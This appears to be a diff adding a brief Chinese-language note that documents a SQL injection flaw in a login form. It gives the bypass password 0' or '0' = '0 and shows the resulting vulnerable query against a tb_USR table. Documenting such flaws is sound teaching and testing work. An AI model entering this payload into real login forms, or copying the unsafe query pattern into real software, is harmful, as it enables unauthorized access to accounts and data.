@@ -1,0 +1,3 @@
+登录时，用户名随意，密码为0' or '0' = '0，点击登录，登录成功，即可实现sql注入
+sql注入漏洞：
+select * from tb_USR where studentID = 'test' and password = '0' or '0' = '0'
